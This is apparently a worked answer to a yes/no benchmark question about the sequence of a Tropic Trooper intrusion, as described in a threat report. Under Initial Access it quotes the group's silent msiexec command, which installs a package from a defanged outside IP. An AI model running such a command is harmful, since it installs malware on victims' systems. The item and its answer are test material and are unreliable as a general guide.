### Step-by-Step Analysis

#### 1. Analyze the CTI Report

**Initial Access:**
- Tropic Trooper exploited CVE-2017-11882 or CVE-2018-0802 in Microsoft Office's Equation Editor.
- They downloaded and installed an MSI package using the command: `/c msiexec /q /i [hxxp://61[.]216[.]5[.]24/in.sys]`.

**Persistence:**
- The backdoor loads and decrypts an encrypted configuration file.
- It uses SSL to connect to C&C servers.

**Defense Evasion:**
- DLL hijacking is used to evade antivirus detection.
- The installer drops three files into the `Apple/Update` directory and creates a hidden directory `UFile` in `C:\ProgramData\Apple\Update\`.
- The loader, named `FakeRun`, executes `dllhost.exe` and injects a malicious DLL (the backdoor) into this process.

**Command and Control:**
- TClient uses SSL to connect to the C&C server.
- The C&C server and configuration values are not hardcoded, allowing for easy updates.
- TClient uses symmetric encryption to decrypt its configuration and custom SSL libraries to connect to the C&C server.

#### 2. Analyze the Question

**Question:**
- After Tropic Trooper gains initial access by exploiting Microsoft Office's Equation Editor vulnerabilities to download and install an MSI package, is it likely that malicious documents hosting the backdoor's dropper will be executed before the backdoor establishes persistence by decrypting its configuration file and connecting to the command-and-control servers via SSL?

**Answer Choices:**
- A: Yes
- B: No

#### 3. Compare and Evaluate

**Initial Access:**
- The initial access is achieved by exploiting vulnerabilities in Microsoft Office's Equation Editor and downloading an MSI package.

**Persistence:**
- The backdoor loads and decrypts an encrypted configuration file.
- It then uses SSL to connect to C&C servers.

**Sequence of Events:**
1. **Initial Access:**
   - Exploit vulnerabilities in Microsoft Office's Equation Editor.
   - Download and install the MSI package.

2. **Persistence:**
   - The backdoor loads and decrypts the configuration file.
   - Establishes a connection to the C&C server using SSL.

**Malicious Documents:**
- The report mentions that Tropic Trooper uses exploit-laden Microsoft Office documents to deliver malware.
- However, it does not specify that these documents are executed after the initial access and before the backdoor establishes persistence.

**Reasoning:**
- The initial access is achieved by exploiting the Equation Editor vulnerabilities and downloading the MSI package.
- The MSI package is then installed, which drops the necessary files and creates the hidden directory.
- The backdoor is loaded, and it decrypts the configuration file and establishes a connection to the C&C server.
- There is no indication in the report that malicious documents are executed between the initial access and the establishment of persistence.

#### 4. Final Answer

**Final Answer: B: No**

The sequence of events described in the CTI report suggests that the backdoor establishes persistence by decrypting its configuration file and connecting to the C&C server immediately after the initial access, without the need for additional execution of malicious documents.
